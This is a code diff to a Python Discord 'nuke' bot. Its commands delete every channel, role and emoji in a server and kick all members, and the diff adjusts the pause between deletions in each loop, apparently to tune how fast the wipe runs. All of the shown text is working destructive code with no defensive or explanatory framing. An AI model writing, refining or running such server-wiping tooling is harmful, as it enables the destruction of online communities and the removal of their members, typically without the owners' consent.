@@ -127,7 +127,7 @@ async def nuke_channels(ctx):
         try:
             await channel.delete(reason="Nuke: channels")
             count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     try:
@@ -148,7 +148,7 @@ async def nuke_roles(ctx):
         try:
             await role.delete(reason="Nuke: roles")
             count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     await send_result(ctx, [f"🗑️ Deleted **{count}** roles."])
@@ -163,7 +163,7 @@ async def nuke_channels_roles(ctx):
         try:
             await channel.delete(reason="Nuke: channels+roles")
             ch_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
@@ -172,7 +172,7 @@ async def nuke_channels_roles(ctx):
         try:
             await role.delete(reason="Nuke: channels+roles")
             role_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     try:
@@ -191,7 +191,7 @@ async def nuke_kick(ctx):
         try:
             await channel.delete(reason="Nuke: kick")
             ch_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
@@ -200,7 +200,7 @@ async def nuke_kick(ctx):
         try:
             await role.delete(reason="Nuke: kick")
             role_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     async for member in guild.fetch_members(limit=None):
@@ -209,7 +209,7 @@ async def nuke_kick(ctx):
         try:
             await member.kick(reason="Nuke: kick all")
             kick_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     try:
@@ -228,7 +228,7 @@ async def nuke_full(ctx):
         try:
             await channel.delete(reason="Nuke: full reset")
             ch_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     for role in list(guild.roles):
@@ -237,14 +237,14 @@ async def nuke_full(ctx):
         try:
             await role.delete(reason="Nuke: full reset")
             role_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     for emoji in list(guild.emojis):
         try:
             await emoji.delete(reason="Nuke: full reset")
             emoji_count += 1
-            await asyncio.sleep(0.001)
+            await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
     async for member in guild.fetch_members(limit=None):
